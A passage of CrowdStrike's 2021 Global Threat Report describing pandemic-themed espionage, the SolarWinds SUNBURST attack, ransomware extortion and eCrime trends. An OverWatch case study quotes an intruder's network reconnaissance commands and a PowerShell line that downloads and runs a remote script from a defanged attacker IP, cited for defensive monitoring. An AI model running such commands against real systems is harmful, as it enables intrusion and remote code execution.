veryone reading this will likely remember the year 2020 for the rest
of their lives. It was a year of hardship and grief for many, as well as
tumultuous social and economic change on a global scale. For most of
us in the business of stopping breaches and protecting organizations
from cyberattacks, it was also perhaps the most active year in memory.
The onslaught was unrelenting, and for some organizations, overwhelming. As stayat-home orders rippled around the world, we saw office blocks turn into ghost towns
virtually overnight. Millions of workers retreated to hastily equipped home offices,
creating a feeding frenzy for cyber predators spurred on by the windfall of easy
access to sensitive data and networks. At the same time, fear, concern and curiosity
surrounding COVID-19 provided the perfect cover for a record-setting increase in
social engineering attacks from both eCrime actors and targeted intrusion adversaries.
As the saying goes, “the devil is in the details,” and in many ways, that sums up this
year’s Global Threat Report. The details revealed in these pages are derived from
firsthand observations of our frontline cyber responders and analysts, coupled with
insights drawn directly from the unprecedented volume of crowdsourced threat
telemetry we continuously collect and dissect on behalf of our customers.
Among the details you’ll learn in this report:
	
How state-sponsored adversaries infiltrated networks to steal valuable data on
vaccine research and government responses to the pandemic
	
How criminal adversaries introduced new business models to expand their “big
game hunting” ransomware activities — and made them even more potent with
the addition of blackmail and extortion techniques
	
How both eCrime and targeted intrusion adversaries stepped up their
development efforts, deploying a variety of inventive new methods to evade
detection and confound defenders
Our annual report also offers some important lessons and recommendations for
security teams operating in today’s environment. As threat actors add new tools,
techniques and procedures to their arsenals, and form new alliances to bolster their
strength and extend their reach, visibility and speed are more critical than ever.
Security teams must become more versatile, more proactive and more productive to
stay ahead of threats.
CrowdStrike is committed to helping you achieve and maintain an advantage over
adversaries. We’re working hard to help you secure your cloud environments, just
as you would on-premises systems. We’re providing better ways for you to identify
and proactively address potential vulnerabilities before they can be leveraged by
attackers. We’re helping you protect identities and access, including new Zero Trust

capabilities to compartmentalize your operations, restrict data access and reduce
risk to your most sensitive information. These are just a few of the ways we are
pushing the envelope, expanding our protection capabilities so we can enhance and
empower yours.
We spent much of 2020 hoping that its unique challenges would quickly be
consigned to history. Let’s hold onto that hope, but at the same time, we need to stay
clear-eyed and resolute about the hurdles that lie ahead. I hope this report on recent
global threat activity and trends helps you become better informed and better able
to meet those challenges, so when we finally put this chapter of history behind us,
we’ll be able to look back and reflect on not just our losses, but also a few victories.

2021 Global Threat Report

Introduction
↘
CrowdStrike
Intelligence offered
an unparalleled
level of coverage
in 2020, adding 19
named adversaries
to bring the total of
tracked actors across
the globe to 149,
and increasing the
number of tracked
activity clusters under
continued monitoring
to 24.

A

s 2021 began, the world faced the possibility that we have not entirely
put the unprecedented challenges of 2020 behind us. Healthcare sector
entities continue to fight the COVID-19 pandemic that, beyond the tragic
human toll of the disease, fueled numerous incidents of malicious cyber
activity. The ransomware adversaries that proliferated in 2020 are as motivated as
ever, evidenced by the introduction of increasingly damaging tactics, techniques and
procedures (TTPs). Finally, as 2020 came to a close, a major supply chain software
attack racked the U.S. public sector and adjacent industries.
TWISTED SPIDER’s adoption of data extortion tactics was singled out in early
2020 as a direction other eCrime actors might pursue to capitalize on ransomware
infections — a preview of what would become, without exaggeration, an explosion
of similar activity throughout the year. The allure of big game hunting (BGH) —
ransomware campaigns aimed at high-value targets — dominated the ecosystem
of eCrime enablers in 2020, spurring the market for network access brokers. BGH
trends also disrupted traditional targeted eCrime behavior — as seen by threat
actor CARBON SPIDER’s shift away from the targeting point-of-sale (POS) systems
to join the BGH ranks. WIZARD SPIDER — a BGH actor and established eCrime
“megacorp” — sustained their high-tempo operations to become the most reported
eCrime adversary for the second year in a row.
Not even the global pandemic could slow the pace of targeted intrusions in 2020,
nor could the large number of public disclosures regarding adversary activity in both
2019 and 2020. In continuation of a trend highlighted in 2019, Chinese adversaries
targeted telecommunications, with WICKED PANDA having another prolific year,
despite indictments against individuals associated with their operations. As
expected, Democratic People's Republic of Korea (DPRK) adversaries sustained
their currency-generation efforts. Interestingly, the blending of eCrime and targeted
intrusion tactics previously associated with these North Korean actors and some
Russian adversaries was also observed from Iran-nexus PIONEER KITTEN.
To tackle these threats, CrowdStrike Intelligence has offered an unparalleled level
of coverage, adding 19 named adversaries to bring the total of tracked actors
across the globe to 149. In instances where CrowdStrike Intelligence lacks sufficient
information or evidence to assign an adversary name, targeted intrusion activity
is tracked as a “cluster.” In 2020, the number of tracked activity clusters under
continued monitoring rose to 24.

Introducing the eCrime Index
The eCrime ecosystem is an active and diffuse economy of financially motivated
entities that engage in myriad criminal activities in order to generate revenue. The
market dynamics as observed by the CrowdStrike Intelligence team over the past
several years are fluid; as new mechanisms and schemes are devised to generate
revenue, new avenues of monetization are identified, and as the global geopolitical and

economic landscape changes, adversaries evolve their tactics to maximize profits. This
underground economy parallels global markets in many ways. In order to understand the
ebbs and flows of this ecosystem, CrowdStrike has devised a computed value to assess
the state of eCrime. The eCrime Index (ECX) is based on various observables, weighted
by impact, that are continuously monitored by CrowdStrike subject matter experts.
The ECX helps identify notable changes that can then be further investigated. Analysis
results of such events and the continuous tracker to monitor changes will be shared on
the Adversary Universe website.

Threat Hunting Overview

T

he CrowdStrike Falcon OverWatch™ managed threat hunting team
continues to observe major increases in interactive intrusion activity,
as illustrated in Figure 1. In just two years, there has been a fourfold
increase in the number of interactive intrusions — those involving the
use of hands-on-keyboard techniques — uncovered by OverWatch.

The growth in intrusion numbers has been driven in large part by the proliferation
of eCrime activity. As shown in Figure 2, eCrime intrusions made up 79% of all
attributable intrusions uncovered by OverWatch in 2020.

Figure 2. Relative Frequency of Targeted and eCrime Intrusions Uncovered by OverWatch, 2019
vs. 2020

With nearly four out of five interactive intrusions uncovered in 2020 being driven
by eCrime actors, it’s imperative that these adversary groups, and methods for
defending against their TTPs, deserve a great deal of attention in the coming year.
However, targeted intrusions driven by state-sponsored groups should not be
neglected. While the relative slice of pie representing targeted intrusions shrank
in 2020 compared to 2019, it should be noted that the overall numbers of both
targeted and eCrime intrusions are significantly larger than in 2019. OverWatch’s
observations show that nation-state adversaries are not letting up and continue to
merit strong consideration in 2021.

Global Pandemic Brings COVID-19
Themes and Healthcare Sector
Targeting

I

n January 2020, medical and government personnel sought to understand
the nature and potential threat of COVID-19, which had broken out in China’s
Hubei province. Within weeks, the virus migrated beyond China to the rest of
Asia, Europe, North America and the Middle East. By March, unprecedented
stay-at-home orders were put into effect around the world to slow the spread of the
disease. Concern over the growing threat of the pandemic made for valuable subject
matter for criminal and targeted intrusion adversaries, who used COVID-19 themes in
phishing campaigns and lures. CrowdStrike Intelligence also identified both eCrime
and targeted intrusion adversaries specifically attacking the healthcare sector
throughout the pandemic.

Targeted Intrusions
In the early days of the pandemic, objectives for targeted intrusion actors may have
included acquiring information on infection rates or country-level responses to the
treatment of COVID-19. However, as the pandemic accelerated, governments were
faced with daunting infection rates, mounting deaths and overburdened hospitals.
The search for a vaccine became of paramount importance, and the scientific
information that could lead to a vaccine for COVID-19 was a high-priority collection
requirement for many targeted intrusion adversaries.

NORTH KOREA
While VELVET CHOLLIMA and LABYRINTH CHOLLIMA began distributing COVID19-themed lure documents in April 2020, this type of decoy content did not initially
indicate healthcare sector targeting and instead was aimed at foreign policy officials.
However, in September 2020, Falcon OverWatch detected SILENT CHOLLIMA in
the environment of an Asian pharmaceutical sector organization. One month later,
CrowdStrike Intelligence discovered phishing domains linked to VELVET CHOLLIMA
that appear to spoof U.K., U.S. and South Korean pharmaceutical companies leading
efforts on COVID-19 research. Concurrent with VELVET CHOLLIMA’s phishing
activity, OverWatch detected LABYRINTH CHOLLIMA attempting to infiltrate a U.S.based healthcare provider, and it was subsequently reported in open sources that
LABYRINTH CHOLLIMA likely targeted several pharmaceutical companies involved
with COVID-19 vaccine production.

CrowdStrike

2021 Global Threat Report

VIETNAM
CrowdStrike Intelligence identified a significant temporal overlap between Vietnambased OCEAN BUFFALO’s early January 2020 targeting of Chinese private and
government institutions playing critical roles in combating COVID-19, and the
Vietnamese government’s very early and robust response in enacting sweeping
measures to prevent the virus’s spread into the country. The severity and breadth of
Vietnam’s measures stood out, as they began weeks before the first confirmed cases
of COVID-19 in Vietnam and at a time when only two deaths had occurred in China.

IRAN
During early December 2020, CrowdStrike Intelligence identified STATIC KITTEN
targeting a government entity located in the Middle East and North Africa (MENA)
region. The activity consisted of credential collection via a known variant of Mimikatz,
lateral movement, and the probable staging of documents related to COVID-19 for
exfiltration. The healthcare sector has been a target of STATIC KITTEN since January
2020, suggesting that the adversary’s priorities in 2020 included an expanded focus
on health-related topics even prior to the outbreak of COVID-19.

RUSSIA
In July 2020, the U.S., U.K. and Canadian governments released information describing
a COZY BEAR campaign that targeted COVID-19 research facilities. This campaign
was reportedly conducted throughout 2020 and was likely intended to steal
information relating to the development and testing of vaccines targeting the virus.

CHINA
In July 2020, the U.S. Department of Justice (DOJ) indicted two Chinese nationals
with alleged ties to the Chinese Ministry of State Security (MSS) for wide-ranging
cyber operations, the most recent of which reportedly included targeting U.S.based COVID-19 research centers. Intelligence officials in Spain also claimed that a
China-nexus actor had successfully stolen information relating to COVID-19 vaccine
development from Spanish research institutes in September 2020. In addition to
this reported activity, CrowdStrike identified five suspected China-origin campaigns
targeting healthcare entities in 2020.

eCrime
BGH TARGETING HEALTHCARE SECTOR
Even under normal operating conditions, the healthcare vertical faces a significant
threat from criminal groups deploying ransomware, the consequences of which
can include the disruption of critical care facilities. Along with the possibility of
significant disruption to critical functions, victims face a secondary threat from
ransomware operations that exfiltrate data prior to the execution of the ransomware,
a trend observed across all sectors throughout 2020 (see the section “Big Game
Hunters Adopt Data Extortion Methods”).

13

↘

Amid the pandemic, the healthcare sector proved to be a controversial target among
BGH operators. Some adversaries — including TWISTED SPIDER, VIKING SPIDER,
GRACEFUL SPIDER and TRAVELING SPIDER — publicly announced intentions to
avoid targeting frontline healthcare entities. Others, including DOPPEL SPIDER,
said that any unintentional infections against a healthcare provider would be quickly
resolved by providing decryption keys without requiring payment. An incident
affecting a Germany-based hospital triggered such a response in September
2020. Despite these assertions, CrowdStrike Intelligence confirmed that 18 BGH
ransomware families infected 104 healthcare organizations in 2020, with the most
prolific being TWISTED SPIDER using Maze, and WIZARD SPIDER using Conti. In
some cases, adversaries may have avoided targeting hospitals, but proceeded with
attacks against pharmaceutical and biomedical companies.

WIZARD SPIDER
actively targeted the
healthcare sector in Q4
2019, and the rise of Ryuk
infections in October 2020
demonstrated a repetition
in targeting preferences.
Similarly, this adversary
focused on the academic
sector during SeptemberOctober 2019 and again
in 2020 as students
were returning to school
following summer vacation.

As depicted in Figure 3, TWISTED SPIDER achieved at least 26 infections at
healthcare sector victims with their Maze and Egregor ransomware families,
predominantly at U.S.-based entities. WIZARD SPIDER conducted 25 attacks
against the healthcare industry with both Conti and Ryuk. Throughout October
2020, Ryuk was heavily attributed to a large number of infections against U.S.-based
healthcare entities, a surge that occurred despite a concerted disruption effort by
cybersecurity vendors in September 2020. This surge also prompted a response by
law enforcement on Oct. 28, 2020, when the U.S. Federal Bureau of Investigation
(FBI) issued an alert warning of attacks involving WIZARD SPIDER’s TrickBot leading
to ransomware infections and disruption to healthcare services.

These trends indicate
a degree of planning by
WIZARD SPIDER to target
certain verticals at times of
the year when ransomware
campaigns would have the
most significant impact.

TRENDS IN ECRIME PHISHING THEMES
Social engineering techniques are frequently used by criminally motivated threat
actors to tailor phishing campaigns, malspam emails and fraudulent scams. The
psychology behind many of these techniques is to prey on human emotions and
behavior, the most exploitable of which are greed, curiosity, fear and the desire to
help. The COVID-19 pandemic provided criminal actors with a unique opportunity to
use lure content and social engineering techniques capable of targeting each of these
components of human behavior. As a topic, COVID-19 has global impact, 24-hour news
coverage and as of this writing, no clear end in sight.

Pandemic-Related eCrime Phishing Themes
Exploitation of individuals looking for details on disease tracking, testing and treatment
Impersonation of medical bodies, including the World Health Organization (WHO) and U.S.
Centers for Disease Control and Prevention (CDC)
Financial assistance and government stimulus packages
Tailored attacks against employees working from home
Scams offering personal protective equipment (PPE)
Passing mention of COVID-19 within previously used phishing lure content (e.g., deliveries,
invoices and purchase orders)

Table 2. eCrime Phishing Themes Referencing COVID-19

Like pre-pandemic phishing campaigns, these attacks attempted to encourage a
human response — either to interact with a hyperlink or attachment to an email, or
to attract visitor traffic via online searches. By the summer of 2020, criminal actors
began to return to previously popular lure content, albeit with some references to
COVID-19 added.

Outlook
COVID-19 has significantly impacted economic, social, religious, business and political
spheres. The numerous targeted intrusion operations against healthcare sector
entities underscore the value that vaccine-related intellectual property had in 2020
and going forward. With the recent authorization and release of vaccines, vaccination
rollout plans will likely become a target of intelligence-gathering efforts by statesponsored adversaries in 2021. Variations on COVID-19 themes arising this year will
likely include lure content referencing vaccinations or new variants of the disease.

O

n Dec. 13, 2020, public reporting revealed details of a sophisticated
supply chain attack against the update deployment mechanism
of the SolarWinds Orion IT management software. The adversary
responsible used this operation to distribute and install malicious
code, dubbed SUNBURST. Because of the nature of this initial intrusion vector,
deployments of malicious code have been observed and reported by a large number
of organizations spread across multiple verticals worldwide.

Initial Access and Exploitation

Healthcare

Analysis of a virtual machine used in the software build provided insight into the
way the build process was hijacked by the adversary — tracked by CrowdStrike as
the StellarParticle activity cluster. StellarParticle installed a monitoring tool tracked
by CrowdStrike Intelligence as SUNSPOT, which detects the beginning of the
Orion packages build and replaces one of the source code files with a backdoored
version containing both an execution path inserted in the legitimate Orion code,
and SUNBURST’s source code. The design of SUNSPOT suggests StellarParticle
developers invested significant efforts into ensuring the tampering process worked
properly, and added strong conditions to avoid revealing their presence in the build
environment to SolarWinds developers.
Once installed, SUNBURST has the ability to collect information about the host,
enumerate files and services on the system, make HTTP requests to arbitrary URLs,
write/delete/execute arbitrary files, modify registry keys, terminate processes and
reboot the system. These capabilities enable StellarParticle to verify whether a
victim host is of further interest prior to the deployment of additional malicious code.
Analysis of this activity indicates the distribution of the backdoored updates of
SolarWinds Orion likely started on or around March 24, 2020.
SUNBURST hides in plain sight by using source code naming conventions similar to
those of SolarWinds’ developers, as well as by using two different communication
channels for command and control (C2), based on DNS requests camouflaging as
Amazon Web Services (AWS) traffic and on HTTP requests with the same structure
as SolarWinds’ Orion Improvement Program (OIP) telemetry traffic. Strong execution
guardrails were added to the backdoor to evade detection with various techniques,
which in particular include tampering with security software services in order to
disable them.

CrowdStrike

2021 Global Threat Report

Post-Exploitation
Although the SUNBURST C2 infrastructure ceased to operate on or around Oct. 6,
2020, post-exploitation of the initial access obtained using the backdoor continued
into December 2020 and may still be ongoing. Industry reporting identified postexploitation actions associated with this activity that include the deployment of nextstage tooling, such as TEARDROP and Cobalt Strike, through SUNBURST, as well
as hands-on-keyboard activity using PowerShell to interact with various enterprise
network services. Targeting of internal services includes a reported interest in Active
Directory (AD) credential compromise, email collection and cloud infrastructure
lateral movement.
Analysis of the backdoor suggests that only a subset of the victims that experienced
SUNBURST infections actually received post-exploitation tasking from StellarParticle
operators, although the exact scope selected by the adversary remains unclear.

Infrastructure
The StellarParticle adversary took noticeable steps to avoid common operational
security (OPSEC) mistakes in the process of registering and managing
infrastructure. The only technical overlap between all of the known domains was the
purchase of SSL certificates issued by commercial certificate authority Sectigo, but
this is too widely used to aid with analytical pivots. There is no IP address overlap
between domains, as each is hosted on separate cloud or VPS infrastructure.
Additionally, the actor used multiple registrars and hosting services for the domains
and servers. The adversary did not register domains in bulk, preferring to buy old
and comparatively expensive domains, likely to obtain more reputable infrastructure.

CrowdStrike

2021 Global Threat Report

Abuse of O365
In addition to the deployment of the SUNBURST backdoor, the StellarParticle actors
demonstrated exceptional knowledge of Microsoft O365 and the Azure environment.
Other victims of this intrusion have since come forward who have reported that
O365 was a consistent target of the adversary. In CrowdStrike’s own experience, it
was determined this adversary successfully targeted a Microsoft Reseller and used
delegated access meant to allow the reseller to audit licenses to abuse O365 Oauth
applications to unsuccessfully target email. StellarParticle’s comfort and capabilities
in abusing Azure and O365 demonstrate they have a detailed understanding of the
authentication and access controls associated with those platforms.

Attribution
Public reports have suggested an attribution of the StellarParticle activity cluster
to the Russian Foreign Intelligence Service of the Russian Federation (SVR), an
organization associated by CrowdStrike Intelligence to COZY BEAR. However, as of
February 2021, CrowdStrike Intelligence does not attribute StellarParticle activity to
a named adversary or geographic nexus.

Table 4. StellarParticle Summary

Outlook
Supply chain attacks are nothing new; CrowdStrike publicly raised them as a rising
threat as far back as 2018 and believes they will continue to be a major intrusion
vector. Supply chain attacks represent a unique initial access tactic that provides
malicious actors with the ability to propagate from a single intrusion to multiple
downstream targets of interest. In addition to software-based attacks, such as the
one that affected SolarWinds, supply chain attacks can take the form of hardware
or third-party compromises. CrowdStrike Intelligence has identified supply chain
and trusted relationship compromises originating from both eCrime and targeted
intrusion adversaries. eCrime actors commonly use the access from these
compromises for financial gain, generally deploying ransomware and mineware,
whereas targeted intrusion adversaries primarily use compromises to deploy
espionage-driven toolsets to a broad set of users. Given the potential high return on
investment for threat actors, CrowdStrike Intelligence anticipates these attacks will
continue to threaten organizations across all sectors in 2021.

Big Game Hunters Adopt Data
Extortion Methods

S

ince the original BGH adversary — BOSS SPIDER — was identified in
January 2016, CrowdStrike Intelligence has observed both established
criminal actors (e.g., INDRIK SPIDER and WIZARD SPIDER) and
ransomware operators adopting and reimagining BGH tactics.
Throughout 2020, BGH continued to be a pervasive threat to companies worldwide
across all verticals, with CrowdStrike Intelligence having identified at least 1,377
unique BGH infections. Notable in 2020 was the growing trend of ransomware
operators threatening to leak data from victim organizations, and in some cases
actively doing so. This tactic was highly likely intended to pressure victims to make
payment, but is also likely in response to improved security practices by companies
that could negate encryption of their files by recovering from backups.
Data extortion is a tried-and-true tactic, and even the act of combining data extortion
with a ransomware operation is not new to 2020 — OUTLAW SPIDER first employed
this tactic in May 2019. What marks a departure from previous BGH operations is the
accelerated adoption of the data extortion technique and the introduction of dedicated
leak sites (DLSs) associated with specific ransomware families. These approaches were
adopted by at least 23 ransomware operators in 2020.

Among the threat actors using DLSs and data extortion are the operators of a
crop of new ransomware families identified in 2020. In addition, some existing BGH
adversaries introduced new ransomware variants, and CARBON SPIDER followed
GRACEFUL SPIDER’s lead of transitioning their targeted eCrime operations into
BGH, launching their own ransomware-as-a-service (RaaS) operation.

2021 Global Threat Report

Variations on the Approach
BGH adversaries took different approaches in the release of data onto a DLS, with
many staggering the release of victims’ stolen data. TWISTED SPIDER became
the most adept at this technique, spacing out releases in percentages of the total
exfiltrated dataset. Other adversaries using the percentage release method include
WIZARD SPIDER with Conti victims, and the operators of MountLocker ransomware.
An alternative approach is to release the datasets in numbered “parts,” a technique
preferred by RIDDLE SPIDER and VIKING SPIDER, both of which seemingly choose
the release date manually. CARBON SPIDER developed an automated system that
displays a predetermined publication time set by an automated countdown timer.
Less commonly observed is the release of data by type, where the adversary creates
datasets for personally identifiable information (PII), financial records, sensitive
company data, and information pertaining to partners and customers, and then
releases these datasets at separate intervals. For some victims with higher brand
recognition, each new release can trigger renewed reporting on the incident across
social media platforms or by news outlets. VIKING SPIDER has adopted this approach
with some victims, as have affiliates of PINCHY SPIDER for a small number of REvil
victims. Whichever release method is chosen by the adversary, the intent is almost
certainly to increase pressure on the victim company to pay the ransom.

Targeting
Although most ransomware operations are opportunistic, CrowdStrike Intelligence
identified the highest number of ransomware-associated data extortion operations
this year in the industrial and engineering sector (229 incidents), closely followed by
the manufacturing sector (228 incidents). The manufacturing industry is particularly
vulnerable to ransomware operations. Not only does the industry suffer the normal
consequences of a ransomware infection, but a disruption in day-to-day operations
would greatly affect the core business if a company were unable to meet production
demands due to system outages.

2021 Global Threat Report

TWISTED SPIDER and the Maze Cartel
While OUTLAW SPIDER was the first to be observed using data extortion in a
ransomware campaign, TWISTED SPIDER — operators of Maze and Egregor
ransomware — has been credited with being the catalyst for the heavy adoption of this
technique in 2020. TWISTED SPIDER was the first ransomware actor to launch a DLS,
which was created on Dec. 10, 2019. In June 2020, following an explosion of dedicated
leak sites in the first half of the year, TWISTED SPIDER branded themselves
the leader of the “Maze Cartel,” which was a cooperative effort between them,
VIKING SPIDER, and the operators of LockBit ransomware, as well as unconfirmed
involvement from the operators of SunCrypt and WIZARD SPIDER. The Maze Cartel
shared leaked data from their operations on each of their DLSs in a likely effort to
reach a wider audience, thus putting more pressure on victim companies.
TWISTED SPIDER announced the cessation of Maze operations in November 2020,
declaring the Maze Cartel never existed. CrowdStrike Intelligence assesses the group
has likely rebranded itself and now deploys Egregor ransomware. This assessment
is based on code overlap between Maze and Egregor, an influx in Egregor activity
coinciding with a decline in Maze infections, and similar tactics and layout of the
associated DLS (including leaking victim data in percentage increments).
Despite the demise of Maze, cartels may continue to be created as needed. On
Dec. 22, 2020, a new post made to MountLocker ransomware’s Tor-hosted DLS
was titled “Cartel News” and included details of a victim of VIKING SPIDER’s Ragnar
Locker. Publicizing each other’s operations will likely contribute to the reputation of
BGH operators. If tactics evolve and the adversaries begin to use different hosting
locations for each other’s victim data, it could hinder the ability for a victim to
negotiate the removal and/or destruction of stolen information, further increasing
the risk of it being shared, sold or auctioned to other eCrime actors.

Outlook
Data theft and the use of a DLS have arguably become as engrained in the BGH
ransomware operation as the encryption process itself. Throughout 2020, the BGH
landscape became increasingly postured toward incentivizing the victim to engage
in ransom negotiations once they have been infected with ransomware. In October
2020, the operators of SunCrypt ransomware used a distributed denial-of-service
(DDoS) attack to compel a victim to pay a ransom, introducing a new variation of
the strong-arm tactics that BGH adversaries became known for in 2020. Denial of
access to mission-critical resources, as demonstrated by this SunCrypt operation, is
a potentially fruitful avenue for BGH actors to expand upon.

eCrime Ecosystem

T

he eCrime ecosystem remains vast and interconnected, with many
criminal enterprises existing to support big game hunting operations.
Notable to 2020 is the pivotal role access brokers play in the eCrime
ecosystem, supporting a variety of actors to include BGH ransomware
operators. LUNAR SPIDER and MALLARD SPIDER have also been observed using
their capabilities to adopt this role as well.
Throughout 2020, CrowdStrike Intelligence observed a number of dramatic
changes for targeted eCrime actors. CARBON SPIDER shifted away from
point-of-sale (POS) campaigns in favor of BGH, ultimately introducing their own
ransomware, DarkSide. Established eCrime actors like MUMMY SPIDER, WIZARD
SPIDER and CARBON SPIDER continue to drive innovation in the world of malware
development. Over the year, CrowdStrike Intelligence noted trends in the use of
open-source obfuscation software and the targeting of virtualization environments
pioneered by these adversaries.

2021 Global Threat Report

Trends and Techniques
Increasing Importance of Access Brokers
Access brokers are threat actors that gain backend access to various organizations
(both corporations and government entities) and sell this access either on criminal
forums or through private channels. When criminal malware operators purchase
access, it eliminates the need to spend time identifying targets and gaining access,
allowing for increased and quicker deployments as well as higher potential for
monetization. Some access brokers escalate privileges to the domain administrator
level (often advertised as “full access”), while other access brokers just provide the
credentials and endpoints necessary to gain access.
The use of access brokers has become increasingly common among BGH actors
and aspiring ransomware operators. CrowdStrike Intelligence has observed some
access brokers associated with affiliates of RaaS groups.
Access brokers advertising on criminal forums likely use logs from commodity
information stealers to aid in operations, and some actors may sell the credentials
from these logs as claimed access. The information stealer logs typically contain
data such as IP addresses, endpoint URLs, login credentials, screenshots of the
victim's desktop, cookies, and browser autofill history that can be used to determine
the type of system used as well as provide a vector for initial access. CrowdStrike
Intelligence has observed one access broker, known to be an affiliate of a
ransomware program, confirm they purchased logs to aid in their operations.

Malware Obfuscation Implemented Into Build Processes
In 2020, CrowdStrike Intelligence observed WIZARD SPIDER and MUMMY
SPIDER implement open-source software protection tools into their malware build
processes. This technique was observed with WIZARD SPIDER’s inclusion of
ADVObfuscator into the group’s malware Anchor, BazarLoader and Conti to enable
string obfuscation. In mid-2020, WIZARD SPIDER also implemented the use of the
open-source tool obfuscator-llvm for code obfuscation in samples of BazarLoader.
A similar methodology was incorporated into MUMMY SPIDER’s Emotet malware
delivery platform.
The use of obfuscation techniques in malware is not new, but the inclusion of opensource tools into build processes is an interesting tactic that supports advanced
adversaries seeking ways to keep their development processes agile. WIZARD
SPIDER has likely adopted rapid development cycles to adapt to open-source
reporting on their malware. Moving from custom obfuscation techniques to more
standardized tooling would support more frequent changes to their toolset.
Although these tools are widely available, they can be complex to set up and often
require a level of automated processes. For this reason, this tactic may not be widely
adopted by less sophisticated threat groups. That said, more mature adversaries
may look to this method as a way to protect and obfuscate their malicious payloads.
The use of ADVObfuscator has also been observed in the ransomware variants
LockBit and SunCrypt.

CrowdStrike

2021 Global Threat Report

Targeting Virtualization Infrastructure
In 2020, CrowdStrike Intelligence observed both SPRITE SPIDER (the operators
of Defray777) and CARBON SPIDER (the operators of DarkSide) deploy Linux
versions of their respective ransomware families on ESXi hosts during BGH
operations. While ransomware for Linux has existed for many years, BGH actors
have historically not targeted Linux, much less ESXi specifically. ESXi is a type of
hypervisor that runs on dedicated hardware and manages multiple virtual machines
(VMs). With more organizations migrating to virtualization solutions to consolidate
legacy IT systems, this is a natural target for ransomware operators looking to
increase the impact against a victim.
All identified incidents were enabled by the acquisition of valid credentials. In four
separate Defray777 incidents, SPRITE SPIDER used administrator credentials to
log in through the vCenter web interface. In one instance, SPRITE SPIDER likely
used the PyXie remote access trojan (RAT) LaZagne module to harvest vCenter
administrator credentials stored in a web browser.
By targeting these hosts, ransomware operators are able to quickly encrypt multiple
systems with relatively few actual ransomware deployments. Encrypting one ESXi
server inflicts the same amount of damage as individually deploying ransomware
on each VM hosted on a given server. Consequently, targeting ESXi hosts can also
improve the speed of BGH operations. Additionally, due to their lack of conventional
operating systems, ESXi hosts lack endpoint protection software that could prevent
or detect ransomware attacks.

Targeted eCrime Moves to BGH
By far the most relevant factor influencing targeted eCrime in 2020 is the efficacy of
ransomware operations. CARBON SPIDER dramatically overhauled their operations
in 2020. In April 2020, the adversary abruptly shifted from narrow campaigns
focused entirely on companies operating POS devices to broad, indiscriminate
operations attempting to infect large numbers of victims across all sectors. The goal
of these campaigns was to deliver PINCHY SPIDER’s REvil RaaS. CARBON SPIDER
deepened their commitment to BGH in August 2020 by using their own ransomware,
DarkSide. In November 2020, the adversary took another step into the world of BGH
by establishing a RaaS-affiliate program for DarkSide, allowing other actors to use
the ransomware while paying CARBON SPIDER a cut.
CARBON SPIDER’s shift away from POS campaigns exemplifies a broader
trend of targeted eCrime actors shifting targets to focus on BGH. For instance,
ANTHROPOID SPIDER, which in 2019 targeted financials, conducted opportunistic
web server exploitation campaigns in 2020 that primarily delivered MedusaLocker
ransomware. After February 2020, major adversaries COBALT SPIDER and
WHISPER SPIDER apparently ceased spear-phishing activity against banks. It is
likely that actors associated with both COBALT SPIDER and WHISPER SPIDER
remain involved in eCrime but have chosen other ways to generate income.
Targeted eCrime has not ceased, however; emerging threats in 2020 included
KNOCKOUT SPIDER and SOLAR SPIDER. KNOCKOUT SPIDER has conducted lowvolume spear-phishing campaigns focused on companies involved in cryptocurrency.
SOLAR SPIDER’s phishing campaigns deliver the JSOutProx RAT to financial
institutions across Africa, the Middle East, South Asia and Southeast Asia.

WIZARD SPIDER Continues Prolific Operations
WIZARD SPIDER was the most reported criminal adversary for the second year in a
row. Although activity from this adversary was slow and sporadic in the first quarter
of 2020, they progressively ramped up operations beginning in the second quarter
and through the remainder of the year. Their diverse and potent toolset makes
this criminal group one of the most formidable adversaries in the current eCrime
landscape. CrowdStrike Intelligence has observed WIZARD SPIDER increase their
sector targeting scope in 2020, particularly through the operation of Conti.

OverWatch Feature

WIZARD SPIDER Targets Financial
Institution
During the first quarter of 2020, OverWatch identified a suspected eCrime attack
against a financial institution. OverWatch threat hunters’ deep analysis of this intrusion
played a pivotal role in providing greater insights into a complex threat landscape where
eCrime adversaries are increasingly improving their tradecraft.

ADVERSARY LAUNCHES HIDDEN COMMAND SHELL
During the course of routine hunting, OverWatch uncovered unusual behavior stemming
from a running svchost.exe process on a Windows domain controller. A suspicious,
reflectively loaded dynamic link library (DLL) launched within the svchost.exe netsvcs
group and connected to the adversary-controlled domain statsgdoubleclick[.]net.
Within minutes, OverWatch identified that a hidden interactive command shell had
spawned under the svchost.exe process, further indicating that a malicious implant
was running on the system.

ADVERSARY DOUBLES DOWN ON ATTEMPT TO ACCESS THE
VICTIM ENVIRONMENT
The hidden shell led to interactive, hands-on execution of various host and network
discovery commands. Among the reconnaissance actions were efforts to enumerate
DNS and other network infrastructure, with the likely intention of preparing for lateral
movement. Such commands included:
arp

-a

dnscmd

/enumzones

dnscmd

/zoneprint [REDACTED]

nbtstat

-A

1 [REDACTED]

net sessions
net view
nltest

/domain_trusts

The victim did not perform an immediate and thorough response. Days later, the
adversary returned and attempted to execute unknown PowerShell scripts from an
external remote server:
powershell.exe -nop
$p=4484;[System.Net.ServicePointManager]::ServerCertificateValidation
Callback={$true};iex(New-Object
System.Net.WebClient).DownloadString('https://185.180.197[.]59/msys')

CrowdStrike

2021 Global Threat Report

OverWatch Feature
To run these commands, the adversary used another interactive shell facilitated by
the same previously identified implant running within the svchost.exe netsvcs group.
The Falcon platform’s prevention settings ensured that the PowerShell scripts failed to
execute properly. This led to the adversary attempting to diagnose their failure using
the following commands:
wmic process where name="svchost.exe" get
processid,name,commandline,sessionid,creationdate
tasklist /v
After these failed attempts, the adversary gave up, likely leaving with hopes of finding
an easier target.

CONCLUSIONS AND RECOMMENDATIONS
Further analysis of all command-and-control activity involved in this latest intrusion
identified commonalities with known WIZARD SPIDER infrastructure. Regardless of
the adversary’s identity, defenders should pursue measures to prevent similar attacks.
This includes monitoring unusual behavior from svchost.exe instances, in particular
the presence of suspicious DLLs leveraging svchost.exe to make unusual network
connections to external infrastructure. Defenders should also consider monitoring for
bursts of extensive network configuration discovery commands occurring on hosts or
under user accounts where such behavior is unexpected. Given the popularity of using
PowerShell for post-exploitation command execution, another recommendation is
monitoring for atypical PowerShell processes connecting to external IPs or domains.

eCrime Enablers

E

nablers are a pivotal part of the eCrime ecosystem, providing criminal
actors with capabilities they may otherwise not have access to. These
actors run malware-as-a-service operations, specialize in delivery
mechanisms or exploit networks in order to sell initial access to other
criminal actors.
The relationships depicted in Figure 7 show that eCrime adversaries are not averse
to working with, or purchasing from, other actors in order to enhance their own
